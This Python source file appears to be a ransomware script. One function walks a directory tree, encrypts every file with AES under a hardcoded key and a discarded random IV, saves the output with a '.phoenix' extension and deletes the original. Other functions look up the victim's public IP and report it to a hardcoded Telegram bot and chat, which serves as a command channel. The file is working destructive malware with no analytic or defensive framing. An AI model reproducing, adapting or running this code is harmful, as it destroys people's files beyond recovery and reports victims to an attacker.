import os, random, string
import hashlib, telegram, requests
from Crypto.Cipher import AES


def aircrack(directory):
    secret_key = hashlib.sha256(b"Alouhsperk.AlouhSperk").digest()

    for root, dirs, files in os.walk(directory):
        for file in files:
            with open(os.path.join(root, file), 'rb') as f:
                data = f.read()

            pad_length = 16 - (len(data) % 16)
            data = data + pad_length * chr(pad_length).encode()

            cipher = AES.new(secret_key, AES.MODE_CBC, os.urandom(16))

            encrypted_data = cipher.encrypt(data)

            with open(os.path.join(root, file) + '.phoenix', 'wb') as f:
                f.write(encrypted_data)

            os.remove(os.path.join(root, file))

                


def q(x):
    telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww').send_message(chat_id=-841939764, text=x)



def get():
    url = 'https://api.ipify.org?format=json'
    r = requests.get(url)
    x = r.json()['ip']
    q(f"Connected at: {x}")
    
    
